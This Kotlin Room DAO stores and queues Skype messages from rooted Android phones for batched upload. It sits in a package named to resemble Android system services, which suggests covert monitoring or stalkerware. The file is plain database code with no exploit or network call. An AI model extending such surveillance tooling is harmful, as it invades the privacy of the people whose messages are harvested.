package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.SkypeRooted
import com.android.services.util.AppConstants
import java.util.*

@Dao
interface SkypeRootedDao {

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(skypeRooted: List<SkypeRooted>)

    @Query("Select * from skype_rooted where status =:status ORDER BY date DESC limit ${AppConstants.imLogsUploadLimit}")
    fun selectAllSkypeMessages(status: Int): List<SkypeRooted>

    @Query("Update skype_rooted set status=:updated_status where date BETWEEN :startDate AND :endDate")
    fun update(updated_status: Int, startDate: Date, endDate: Date): Int

    @Query("select max(timeStamp) from skype_rooted")
    fun selectMaxTimeStamp(): Long?
}